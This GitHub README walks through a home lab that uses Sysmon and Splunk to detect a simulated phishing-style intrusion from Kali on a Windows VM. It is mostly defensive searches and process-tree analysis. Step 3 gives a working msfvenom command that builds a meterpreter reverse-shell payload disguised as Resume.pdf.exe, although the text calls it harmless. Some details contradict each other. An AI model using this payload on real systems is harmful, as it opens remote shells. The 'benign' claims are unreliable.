# Homelab-Splunk-Detection
# 🔐 Windows Endpoint Monitoring Lab with Splunk + Sysmon

This repository sets up a Windows Kali home lab to collect and investigate endpoint telemetry using Sysmon and Splunk. It mirrors a narrative style (emoji, step headers, screenshots), but all actions are **benign** and focused on detection.

> Education and defense only. 

---

## 🛠️ Tools
- Windows 10 VM
- Kali Linux VM
- Splunk Enterprise (Search & Reporting)
- Sysmon (Microsoft-Windows-Sysmon/Operational)
- Python 3 (for a local HTTP server)
- PowerShell & CMD

---


# 🌐 Step 1: Configure Internal Network

To ensure that Windows and Kali can communicate securely inside a **home lab**, I configured both VMs to use the **Internal Network** option in VirtualBox/VMware.  
This isolates them from the internet while allowing communication on the same subnet.


## ⚙️ Configuration
- **Windows 10 VM** → assigned IPv4 address `192.168.1.50/24`
- **Kali Linux VM** → assigned IPv4 address `192.168.1.51/24`
- **Default Gateway** → left blank (not required for internal-only traffic)



## 🔍 Verify Windows IP
Open **Command Prompt** in Windows and run:


ipconfig

This displays the IPv4 address, subnet mask, and adapter info.
Confirm it matches 192.168.1.50.

Open a terminal in Kali and run:

ip a
Confirm it shows 192.168.1.51 
---
# 🔎 Step 2: Nmap Discovery (benign)

Now that both VMs are configured with static IPs on the **Internal Network** (Windows → `192.168.1.50`, Kali → `192.168.1.51`), the next step is to verify connectivity and perform a **benign discovery scan** from Kali to Windows.

This simulates a typical reconnaissance step but is **safe and contained** within your home lab.



## 🛠️ Tool Used
- **Nmap** (pre-installed on Kali Linux)



## 📡 Run Nmap Scan
On your **Kali VM**, open a terminal and type:


nmap -A 192.168.1.50, it will scan all the open ports 

![Nmap Scan](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/9a5eb54b4028e40c984cbc0611661b853f1dd002/assets/1.png)
---

# ⚙️ Step 3: Simulate Suspicious File + Listener Setup

In a real red-team or attacker workflow, a tool such as `msfvenom` could generate a payload (e.g., `Resume.pdf.exe`) and then a handler (e.g., Metasploit) would be configured to listen for incoming connections.  

⚠️ For safety, we simulate this entire workflow:
- Instead of generating malware, we create a harmless file named **Resume.pdf.exe**.
- Instead of running a Metasploit handler, we open a **benign listener** using `netcat` on Kali.

This still generates the **process creation** and **network telemetry** we need to practice detection in Splunk.

## 🖥️ On Kali Linux — Create Suspicious-Looking File

# create a harmless text file with a suspicious name
Using msfvenom payloads, msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.51 lport=4444  -f exe  -o Resume.pdf.exe, I have created a Resume.pdf.exe malware.

✅ What This Simulates
The creation of a disguised file (Resume.pdf.exe).

A server is waiting for inbound traffic on port 4444.

When Windows later downloads/executes the file, Sysmon will log:

ProcessCreate events (Resume.pdf.exe spawning processes).

NetworkConnect events (connection to 192.168.1.51:4444).

![Kali Listener](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/baa2be591a32fec70a407fc52efed756bee9a1a2/assets/Screenshot%202025-09-09%20121844.png)
---

# 🌐 Step 4: Host and Download the Suspicious File (Safe Simulation)

In a real-world attack chain, once a handler is set up, an attacker might host a malicious file on a web server and lure the victim to download it.  

⚠️ For this lab, I safely simulate this process by hosting our **benign `Resume.pdf.exe` file** on Kali and then downloading it from Windows. This gives realistic **file creation** and **process execution telemetry** without any malware.


## 🖥️ On Kali Linux  Start HTTP Server
Making sure I am in the same directory where `Resume.pdf.exe` exists, then run:

python3 -m http.server 9999
Serves files from the current directory on port 9999.

Accessible to other machines on the internal network.


🖥️ On Windows, Download the File
Opened a browser in Windows and navigated to:

http://192.168.1.51:9999

![Windows Browser Download](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/dd543e4b5f474c2b2b33238dba705e36395036c0/assets/Screenshot%202025-09-09%20121915.png)

There is a directory listing containing Resume.pdf.exe.

Clicked the file to download it. Saved it to your Desktop or Downloads folder.

---

# 📊 Step 5: Verify Network Connection from Windows

Once the suspicious file (`Resume.pdf.exe`) has been downloaded and opened, the next step is to confirm whether Windows has made a connection back to Kali.  

We do this using the built-in Windows command **`netstat`**.

---

## 🖥️ On Windows (as Administrator)
Open **Command Prompt** with Administrator privileges and run:

netstat -anob

✅ What to Look For

An ESTABLISHED connection from Windows to your Kali VM (192.168.1.51).

The port number (in this example, 5512) indicates the session established from Windows to Kali.

The associated executable (e.g., Resume.pdf.exe) will appear in the output.

Sample output snippet:

Proto  Local Address          Foreign Address        State           PID
TCP    192.168.1.50:5512      192.168.1.51:4444      ESTABLISHED     3288
 [Resume.pdf.exe]

![Netstat Established Connection](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/71f1361dd09653edb56856afb2bbe63a9bf54617/assets/Screenshot%202025-09-09%20121906.png)

📌 Why This Matters

Confirms that the Windows machine initiated a network connection to Kali.
Sysmon will also log this as a NetworkConnect event, which you will later analyze in Splunk.

---
# 📈 Step 6: Configure Splunk to Ingest Sysmon Logs

To analyze Windows activity, Splunk must be set up to collect **Sysmon event logs**.  
This ensures that process creation, file writes, and network connection telemetry from Windows are forwarded into Splunk for investigation.

---

## ⚙️ Splunk Input Configuration

The Splunk input configuration for Sysmon should look like this:

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

yaml
Copy code

- `index = endpoint` → sends Sysmon events to a dedicated index called **endpoint**.  
- `renderXml = true` → ensures the XML event data is fully captured.  
- `source` → identifies the Windows Sysmon log channel.


## 🛠️ Create the Missing Index

If your Splunk does **not yet have an index named `endpoint`**, you must create one:

1. Log in to **Splunk Web**.  
2. Navigate to: **Settings → Indexes → New Index**.  
3. Enter:
   - **Index Name:** `endpoint`  
   - **Index Data Type:** Events  
   - Leave other settings default.  
4. Click **Save**.

This ensures all Sysmon data is ingested into the correct index.


## 🔧 Install Sysmon Add-on for Parsing (Optional but Recommended)

To make events easier to analyze, install the official **Sysmon TA (Technology Add-on)** in Splunk:

- Download from Splunkbase: [Splunk Add-on for Sysmon](https://splunkbase.splunk.com/app/1914).  
- Install via **Manage Apps → Install App from File**.  
- This TA parses Sysmon XML fields into Splunk-friendly fields.


## ✅ Verification

Once configured, verify events are being ingested by running in **Search & Reporting**:


index=endpoint
| stats count by source sourcetype host
You should see results such as:

Source: XmlWinEventLog: Microsoft-Windows-Sysmon/Operational

Sourcetype: XmlWinEventLog

Host: your Windows machine name



![Splunk Index Creation](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/ae7c151f0e15e667470b91a7a64ecd140080bae4/assets/Screenshot%202025-09-03%20103255.png)

📌 Why This Matters
Ensures Sysmon telemetry flows into Splunk.

Provides visibility into process creation, file writes, and network connections.

Sets the foundation for all later detection and investigation steps.

# 🖥️ Step 7: Simulate Command Execution and Capture Telemetry

In offensive scenarios, once a reverse shell is established, an attacker may run reconnaissance commands such as `net user`, `net localgroup`, and `ipconfig`.  

⚠️ For safety, we simulate this activity **locally on Kali linux** instead of using an actual remote shell. This still produces the same Sysmon **ProcessCreate** telemetry for Splunk.

---

## 🖥️ Kali VM use these cmd
net user
net localgroup
ipconfig

![Windows Recon Commands1](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/5a7c9e01070c4d1e5bb9a572968831dbc2e41b8f/assets/Screenshot%202025-09-09%20122041.png)
![Windows Recon Commands2](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/8002a1c8b85b7d7d7a9e7fca0a50766773fb87f1/assets/Screenshot%202025-09-09%20122114.png)
---
# 🔍 Step 8: Analyze Network Connections in Splunk

Now that Sysmon data is being ingested, we can use Splunk to confirm which destination ports Windows connected to when interacting with Kali.


## 🖥️ Splunk Search
In the Splunk **Search & Reporting** app, run the following:

index=endpoint 192.168.1.51
index=endpoint → queries the index where Sysmon logs are stored.

192.168.1.51 → filters events involving the Kali IP.

📊 Results
When expanding the dest port field in Splunk, I see two values:

3389 → Remote Desktop Protocol (RDP)

4444 → Our simulated listener port on Kali

This confirms that:

Windows initiated normal RDP traffic (3389).

Windows also connected back to Kali on the test port (4444) when the suspicious file was executed.

![Splunk Destination Ports](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/08110a64faaab27d7809177bd484a075cd0c5425/assets/Screenshot%202025-09-09%20123103.png)

📌 Why This Matters
Helps us correlate Windows process activity with network connections.

3389 indicates expected Windows service traffic.

4444 represents unusual test traffic, useful for practicing detection and alerting.

---

# 🕵️ Step 9: Search for Suspicious File Execution in Splunk

After downloading and opening the suspicious file (`Resume.pdf.exe`), we can now use Splunk to verify that the activity was logged by Sysmon and ingested into the `endpoint` index.


## 🖥️ Splunk Search
In the Splunk **Search & Reporting** app, run:

index=endpoint Resume.pdf.exe

📊 Results
Splunk returned 15 events related to Resume.pdf.exe.

These events include telemetry such as:

ProcessCreate events (Event ID 1)

CommandLine data showing how the file was executed

ParentImage (e.g., cmd.exe or a browser)

NetworkConnect events if the file attempted connections

This confirms that Splunk successfully recorded the execution of the suspicious file.


![Splunk Search Resume.pdf.exe](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/b112d4f50ccec06134689b08f29d81ea99528398/assets/Screenshot%202025-09-09%20123216.png)

📌 Why This Matters
Allows us to pivot on specific filenames to investigate malicious or suspicious binaries.

Provides visibility into how a suspicious file behaves once executed.

Builds the foundation for correlation searches and alerting in Splunk.
---

# 🧩 Step 10: Investigate Process Creation Events in Splunk

After pivoting on the suspicious file (`Resume.pdf.exe`), we drilled down into **Event Code 1** (Sysmon ProcessCreate). This allowed us to inspect the parent-child process relationship and confirm how the file executed on Windows.


## 🖥️ Splunk Search
Use the following query to filter for `Resume.pdf.exe` process creation events:


index=endpoint Resume.pdf.exe EventCode=1

📊 Results
Expanding one of the events reveals:

ParentImage: C:\Users\mouni\Downloads\Resume.pdf.exe

ProcessId: 3288

ParentProcessId: 5512

ProcessGuid: {f0b2384f-61aa-68c0-760b-000000001500}

OriginalFileName: Cmd.exe

This confirms that the suspicious file spawned a command prompt (cmd.exe), which later executed additional commands.

![Splunk ProcessCreate ParentImage](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/1b12cd706f1a378b4b115a6d83e1f3afd9cd847e/assets/Screenshot%202025-09-09%20123351.png)
![Splunk ProcessCreate ProcessId](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/a2106fe2260a0034c1387235a05286554c6ce06c/assets/Screenshot%202025-09-09%20123445.png)

📌 Why This Matters
Event Code 1 (ProcessCreate) is critical for endpoint monitoring.

It shows exactly which process launched from the suspicious file.

The Process ID (3288) and Process GUID are key identifiers that we can pivot on in the next step to reconstruct the process tree.

---

# 🔎 Step 11: Pivot on Process GUID in Splunk

Once we confirmed that `Resume.pdf.exe` spawned a process (`cmd.exe` with ProcessId **3288**), the next step is to investigate **what that process did afterward**.  
Instead of only tracking Process IDs, we pivot using the **ProcessGuid**, which uniquely identifies the lifetime of the process.


## 🖥️ Splunk Search
Copy the **ProcessGuid** value from the event details (in this case):

{f0b2384f-61aa-68c0-760b-000000001500}


index=endpoint {f0b2384f-61aa-68c0-760b-000000001500}

📊 Results
Splunk returned 6 related events for this ProcessGuid, which include:

ProcessCreate (Event ID 1) → process startup details

CommandLine → exact commands executed

NetworkConnect events (if applicable)

Parent/Child relationships

This gives a full view of what the spawned cmd.exe process did on the system.

![Splunk GUID Pivot](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/d04d2b259fb0891c3d77171a0f871b2f892f9e9c/assets/Screenshot%202025-09-09%20123516.png)

📌 Why This Matters
The ProcessGuid is more reliable than the Process ID because it persists across reboots and avoids PID reuse.

Investigating all events tied to the GUID provides a clear process tree.

Helps analysts reconstruct malicious or suspicious activity step by step.
---
# 📋 Step 12: Build a Process Tree in Splunk

To fully understand what actions were taken by the suspicious file, we use Splunk to reconstruct the **process lineage**.  
This shows how `Resume.pdf.exe` spawned `cmd.exe`, which in turn executed system commands.


## 🖥️ Splunk Search
Run the following query in the **Search & Reporting** app:

index=endpoint {f0b2384f-61aa-68c0-760b-000000001500}
| table _time ParentImage Image CommandLine OriginalFileName
📊 Results
The formatted table shows:

ParentImage: C:\Users\mouni\Downloads\Resume.pdf.exe

Child Process: C:\Windows\System32\cmd.exe

Subsequent Commands:

ipconfig → displays network configuration

net localgroup → lists local groups

net user → lists user accounts

This confirms that the suspicious file executed cmd.exe, which then ran reconnaissance commands.

![Splunk Process Tree](https://github.com/addula-mounika12/Homelab-Splunk-Detection/blob/f0b1e319859236b9607d256e525fcfa844e7526a/assets/Screenshot%202025-09-09%20125609.png)

📌 Why This Matters
The process tree provides clear visibility into how one binary spawns subsequent processes.

Reconnaissance commands (ipconfig, net user, net localgroup) are common attacker techniques.

This method validates that Sysmon + Splunk can capture and surface malicious process activity.
